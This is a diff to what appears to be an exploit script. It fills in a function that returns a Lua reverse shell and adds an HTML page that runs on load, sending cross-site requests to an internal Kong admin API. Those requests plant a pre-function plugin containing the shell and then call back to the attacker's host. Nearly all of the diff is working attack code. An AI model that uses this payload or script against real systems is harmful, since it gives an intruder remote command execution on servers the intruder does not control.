@@ -37,14 +37,53 @@ def makeShell(lhost, lport):
     Returns a lua revshell for lhost and lport.
     """
 
-    pass
+    return f"local s=require('socket');local t=assert(s.tcp());t:connect('{lhost}',{lport});while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"
 
 def formatHTML(lhost, lport):
     """
     Formats HTML RCE code.
     """
+    shell = makeShell(lhost, lport)
+    
+    html_template = f'''<html>
+<head>
+<script>
+function createService() {{
+    fetch("http://172.16.16.2:8001/services", {{
+      method: "post",
+      headers: {{ "Content-Type": "application/json" }},
+      body: JSON.stringify({{"name":"supersecret", "url": "http://127.0.0.1/"}})
+    }}).then(function (route) {{
+      createRoute();
+    }});
+}}
+function createRoute() {{
+    fetch("http://172.16.16.2:8001/services/supersecret/routes", {{ 
+      method: "post",
+      headers: {{ "Content-Type": "application/json" }},
+      body: JSON.stringify({{"paths": ["/supersecret"]}})
+    }}).then(function (plugin) {{
+      createPlugin();
+    }});  
+}}
+function createPlugin() {{
+    fetch("http://172.16.16.2:8001/services/supersecret/plugins", {{ 
+      method: "post",
+      headers: {{ "Content-Type": "application/json" }},
+      body: JSON.stringify({{"name":"pre-function", "config" :{{ "access" :[ "{shell}" ]}}}})
+    }}).then(function (callback) {{
+      fetch("http://{lhost}/callback?setupComplete");
+    }});  
+}}
+</script>
+</head>
+<body onload='createService()'>
+<div></div>
+</body>
+</html>'''
+    
+    return html_template
 
-    pass
 
 def starServer(lport, lhost):
     """
